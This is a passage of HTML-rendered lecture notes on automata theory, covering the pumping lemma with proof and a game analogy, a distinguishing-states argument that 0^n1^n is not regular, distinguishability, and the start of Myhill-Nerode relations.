fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi mathvariant="normal">Δ</mi><mrow><mo fence="true">(</mo><mrow><mo fence="true">(</mo><mi>i</mi><mo separator="true">,</mo><mi>α</mi><mo separator="true">,</mo><mi>β</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><msub><mi>a</mi><mn>0</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mi>i</mi><mo separator="true">,</mo><mi>δ</mi><mrow><mo fence="true">(</mo><mi>α</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>0</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>δ</mi><mrow><mo fence="true">(</mo><mi>β</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>0</mn></msub><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align} A &amp;= \bigcup_{i\in Q} {\left(i, q_0, i\right)} \ f &amp;= \bigcup_{i \in Q\atop z\in F} {\left(i, i, z\right)} \ \Delta\left(\left(i, \alpha, \beta\right), a_0\right) &amp;= \left(i,  \delta\left(\alpha, a_0\right), \delta\left(\beta, a_0\right)\right) \end{align}</annotation></semantics></math></span></data></p>
<h3 id="pumping-lemma"><a class="header" href="#pumping-lemma">Pumping Lemma</a></h3>
<p>Let <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data> be a regular language. <data class="katex-src" value="\exists k > 0"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∃</mi><mi>k</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\exists k &gt; 0</annotation></semantics></math></span></data>, s.t. <data class="katex-src" value="\forall x,y,z"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">\forall x,y,z</annotation></semantics></math></span></data> s.t.
<data class="katex-src" value="xyz \in L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mi>y</mi><mi>z</mi><mo>∈</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">xyz \in L</annotation></semantics></math></span></data> and <data class="katex-src" value="|y| > k"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>y</mi><mi mathvariant="normal">∣</mi><mo>&gt;</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">|y| &gt; k</annotation></semantics></math></span></data>, <data class="katex-src" value="\exists u,v,w"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∃</mi><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo separator="true">,</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">\exists u,v,w</annotation></semantics></math></span></data> s.t. <data class="katex-src" value="y = uvw, v\ne \epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>u</mi><mi>v</mi><mi>w</mi><mo separator="true">,</mo><mi>v</mi><mo mathvariant="normal">≠</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">y = uvw, v\ne \epsilon</annotation></semantics></math></span></data>
s.t. <data class="katex-src" value="\forall i \geq 0, xuv^iwz \in L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>i</mi><mo>≥</mo><mn>0</mn><mo separator="true">,</mo><mi>x</mi><mi>u</mi><msup><mi>v</mi><mi>i</mi></msup><mi>w</mi><mi>z</mi><mo>∈</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">\forall i \geq 0, xuv^iwz \in L</annotation></semantics></math></span></data>.</p>
<p>Proof: <data class="katex-src" value="\exists M = \left(Q, \Sigma, \delta, q_0, F\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∃</mi><mi>M</mi><mo>=</mo><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\exists M = \left(Q, \Sigma, \delta, q_0, F\right)</annotation></semantics></math></span></data> s.t.
<data class="katex-src" value="L\left(M\right) = L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mrow><mo fence="true">(</mo><mi>M</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">L\left(M\right) = L</annotation></semantics></math></span></data>.</p>
<p>Set <data class="katex-src" value="k = |Q|"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>Q</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">k = |Q|</annotation></semantics></math></span></data></p>
<p>Let <data class="katex-src" value="x,y,z \in \Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo>∈</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">x,y,z \in \Sigma^*</annotation></semantics></math></span></data> s.t. <data class="katex-src" value="|y| > k"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>y</mi><mi mathvariant="normal">∣</mi><mo>&gt;</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">|y| &gt; k</annotation></semantics></math></span></data> &amp; <data class="katex-src" value="xyz \in L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mi>y</mi><mi>z</mi><mo>∈</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">xyz \in L</annotation></semantics></math></span></data></p>
<p><data class="katex-src" value="\begin{align*}&#10;\hat{\delta}\left(q_0, x\right) &= q &&#10;\hat{\delta}\left(q, y\right) &= q' &&#10;\hat{\delta}\left(q', z\right) & \in F &&#10;\end{align*}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left right left right left right" columnspacing="0em 1em 0em 1em 0em 1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>q</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>y</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>z</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>∈</mo><mi>F</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*} \hat{\delta}\left(q_0, x\right) &amp;= q &amp; \hat{\delta}\left(q, y\right) &amp;= q' &amp; \hat{\delta}\left(q', z\right) &amp; \in F &amp; \end{align*}</annotation></semantics></math></span></data></p>
<p><data class="katex-src" value="y = y_1y_2...y_r, r> k"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msub><mi>y</mi><mn>1</mn></msub><msub><mi>y</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>y</mi><mi>r</mi></msub><mo separator="true">,</mo><mi>r</mi><mo>&gt;</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">y = y_1y_2…y_r, r&gt; k</annotation></semantics></math></span></data>. We define <data class="katex-src" value="q_i = \hat{\delta}&#10;\left(q, y_1y_2...y_i\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub><mo>=</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><msub><mi>y</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>y</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">q_i = \hat{\delta} \left(q, y_1y_2…y_i\right)</annotation></semantics></math></span></data></p>
<p>Consider the sequence <data class="katex-src" value="q_1q_2q_3...q_r"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub><msub><mi>q</mi><mn>2</mn></msub><msub><mi>q</mi><mn>3</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>q</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">q_1q_2q_3…q_r</annotation></semantics></math></span></data></p>
<p><data class="katex-src" value="\implies \exists s, t"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi mathvariant="normal">∃</mi><mi>s</mi><mo separator="true">,</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">\implies \exists s, t</annotation></semantics></math></span></data> s.t. <data class="katex-src" value="q_s = q_t"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mi>s</mi></msub><mo>=</mo><msub><mi>q</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">q_s = q_t</annotation></semantics></math></span></data> in the sequence (by PHP).</p>
<p>Define</p>
<p><data class="katex-src" value="u = y_1y_2...y_s"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>u</mi><mo>=</mo><msub><mi>y</mi><mn>1</mn></msub><msub><mi>y</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>y</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">u = y_1y_2…y_s</annotation></semantics></math></span></data></p>
<p><data class="katex-src" value="v = y_{s+1}y_{s+2}...y_t"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mo>=</mo><msub><mi>y</mi><mrow><mi>s</mi><mo>+</mo><mn>1</mn></mrow></msub><msub><mi>y</mi><mrow><mi>s</mi><mo>+</mo><mn>2</mn></mrow></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>y</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">v = y_{s+1}y_{s+2}…y_t</annotation></semantics></math></span></data></p>
<p><data class="katex-src" value="w = y_{t+1}y_{t+2}...y_r"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>w</mi><mo>=</mo><msub><mi>y</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><msub><mi>y</mi><mrow><mi>t</mi><mo>+</mo><mn>2</mn></mrow></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>y</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">w = y_{t+1}y_{t+2}…y_r</annotation></semantics></math></span></data></p>
<p><data class="katex-src" value="\begin{align}&#10;\hat{\delta}\left(q_0, x\right)  &= q &#10;\\&#10;\hat{\delta}\left(q, u\right)  &= q_s &#10;\\&#10;\hat{\delta}\left(q_s, v\right)  &= q_s \implies \hat{\delta}&#10;\left(q_s, v^i\right) = q_s &#10;\\&#10;\hat{\delta}\left(q_s, wz\right)  &\in F&#10;\end{align}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>q</mi></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>u</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>q</mi><mi>s</mi></msub></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mi>s</mi></msub><mo separator="true">,</mo><mi>v</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>q</mi><mi>s</mi></msub><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mi>s</mi></msub><mo separator="true">,</mo><msup><mi>v</mi><mi>i</mi></msup><mo fence="true">)</mo></mrow><mo>=</mo><msub><mi>q</mi><mi>s</mi></msub></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mi>s</mi></msub><mo separator="true">,</mo><mi>w</mi><mi>z</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>∈</mo><mi>F</mi></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align} \hat{\delta}\left(q_0, x\right)  &amp;= q  \ \hat{\delta}\left(q, u\right)  &amp;= q_s  \ \hat{\delta}\left(q_s, v\right)  &amp;= q_s \implies \hat{\delta} \left(q_s, v^i\right) = q_s  \ \hat{\delta}\left(q_s, wz\right)  &amp;\in F \end{align}</annotation></semantics></math></span></data></p>
<p>An analogy with a 2 player game:</p>
<p>Prover: I’ll give you a number k</p>
<p>Spoiler: I’ll find x, y, z such that the concatenation is in the language with
length of y &gt; k</p>
<p>Prover: I’ll split y into u, v, w where v is non-empty.</p>
<p>Spoiler: I’ll find an i &gt; 0 such that the pumping lemma string doesn’t belong
in the DFA. If I do that, I’ll win. And L will not be regular.</p>
<h3 id="an-alternate-way-to-prove-that-a-language-is-not-regular"><a class="header" href="#an-alternate-way-to-prove-that-a-language-is-not-regular">An alternate way to prove that a language is not regular.</a></h3>
<p>Suppose you take a DFA for the language. We take an infinite set of strings
such that all of them go to a different state. Then it’s obvious that the
DFA cannot be finite and hence, it is not a DFA.</p>
<p>Example:</p>
<p><data class="katex-src" value="\begin{align}&#10;L &= \{0^n1^n | n \ge 0\}&#10;\\&#10;M &= \left(Q, \Sigma, \delta, q_0, F\right)&#10;\\&#10;L &= L\left(M\right)&#10;\\&#10;W &= \{0^i | i \ge 0\}&#10;\end{align}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>L</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo stretchy="false">{</mo><msup><mn>0</mn><mi>n</mi></msup><msup><mn>1</mn><mi>n</mi></msup><mi mathvariant="normal">∣</mi><mi>n</mi><mo>≥</mo><mn>0</mn><mo stretchy="false">}</mo></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>M</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>L</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>L</mi><mrow><mo fence="true">(</mo><mi>M</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>W</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo stretchy="false">{</mo><msup><mn>0</mn><mi>i</mi></msup><mi mathvariant="normal">∣</mi><mi>i</mi><mo>≥</mo><mn>0</mn><mo stretchy="false">}</mo></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align} L &amp;= {0^n1^n | n \ge 0} \ M &amp;= \left(Q, \Sigma, \delta, q_0, F\right) \ L &amp;= L\left(M\right) \ W &amp;= {0^i | i \ge 0} \end{align}</annotation></semantics></math></span></data></p>
<p>We claim that any two strings in <data class="katex-src" value="W"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span></data> reach a different state.</p>
<p><strong>Proof:</strong></p>
<p><data class="katex-src" value="\begin{align}&#10;\hat{\delta}\left(q_0, 0^i\right) &\ne \hat{\delta}\left(q_0, 0^j\right) &#10;\forall i \ne j&#10;\\&#10;\hat{\delta}\left(q_0, 0^i1^i\right) &= \hat{\delta}\left(\hat{\delta}&#10;\left(q_0, 0 ^i\right), 1^i\right) &#10;\\&#10;&\ne \hat{\delta}\left(\hat{\delta}\left(q_0, 0^j\right), 1^i\right)&#10;\end{align}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msup><mn>0</mn><mi>i</mi></msup><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo mathvariant="normal">≠</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msup><mn>0</mn><mi>j</mi></msup><mo fence="true">)</mo></mrow><mi mathvariant="normal">∀</mi><mi>i</mi><mo mathvariant="normal">≠</mo><mi>j</mi></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msup><mn>0</mn><mi>i</mi></msup><msup><mn>1</mn><mi>i</mi></msup><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msup><mn>0</mn><mi>i</mi></msup><mo fence="true">)</mo></mrow><mo separator="true">,</mo><msup><mn>1</mn><mi>i</mi></msup><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo mathvariant="normal">≠</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msup><mn>0</mn><mi>j</mi></msup><mo fence="true">)</mo></mrow><mo separator="true">,</mo><msup><mn>1</mn><mi>i</mi></msup><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align} \hat{\delta}\left(q_0, 0^i\right) &amp;\ne \hat{\delta}\left(q_0, 0^j\right)  \forall i \ne j \ \hat{\delta}\left(q_0, 0^i1^i\right) &amp;= \hat{\delta}\left(\hat{\delta} \left(q_0, 0 ^i\right), 1^i\right)  \ &amp;\ne \hat{\delta}\left(\hat{\delta}\left(q_0, 0^j\right), 1^i\right) \end{align}</annotation></semantics></math></span></data></p>
<p>If this wasn’t true then both the strings will be accepted, which is
impossible according to the language.</p>
<h3 id="distinguishability"><a class="header" href="#distinguishability">Distinguishability</a></h3>
<p><strong>Defn</strong>: Let <data class="katex-src" value="L \subseteq \Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>⊆</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">L \subseteq \Sigma^<em></annotation></semantics></math></span></data> be a language. Two strings <data class="katex-src" value="x,y \in&#10;\Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">x,y \in \Sigma^</em></annotation></semantics></math></span></data> are said to be distinguishable by <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data> if <data class="katex-src" value="\exists z \in&#10;\Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∃</mi><mi>z</mi><mo>∈</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\exists z \in \Sigma^*</annotation></semantics></math></span></data> s.t. <data class="katex-src" value="xz \in L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mi>z</mi><mo>∈</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">xz \in L</annotation></semantics></math></span></data> and <data class="katex-src" value="yz \notin L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mi>z</mi><mo mathvariant="normal">∉</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">yz \notin L</annotation></semantics></math></span></data>.</p>
<p><strong>Defn</strong>: A set <data class="katex-src" value="S"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span></data> is distinguishable if <data class="katex-src" value="\forall i \ne j \in S"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>i</mi><mo mathvariant="normal">≠</mo><mi>j</mi><mo>∈</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">\forall i \ne j \in S</annotation></semantics></math></span></data> and <data class="katex-src" value="i"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></data>
and <data class="katex-src" value="j"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span></data> are distinguishable.</p>
<p><strong>Theorem</strong>: Let <data class="katex-src" value="L \subseteq \Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>⊆</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">L \subseteq \Sigma^*</annotation></semantics></math></span></data> be a regular language and <data class="katex-src" value="S"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span></data> be
a distinguishable set. For any DFA accepting <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data>, <data class="katex-src" value="\left|Q\right| \ge&#10;\left|S\right|"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">∣</mo><mi>Q</mi><mo fence="true">∣</mo></mrow><mo>≥</mo><mrow><mo fence="true">∣</mo><mi>S</mi><mo fence="true">∣</mo></mrow></mrow><annotation encoding="application/x-tex">\left|Q\right| \ge \left|S\right|</annotation></semantics></math></span></data>.</p>
<h3 id="myhill-nerode-relations"><a class="header" href="#myhill-nerode-relations">Myhill-Nerode Relations</a></h3>
<p>An equivalence relation <data class="katex-src" value="\equiv"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≡</mo></mrow><annotation encoding="application/x-tex">\equiv</annotation></semantics></math></span></data> over a language <data class="katex-src" value="L \subseteq \Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>⊆</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">L \subseteq \Sigma^*</annotation></semantics></math></span></data> is
said to be a <em>Myhill-Nerode relation</em> if</p>
<ol>
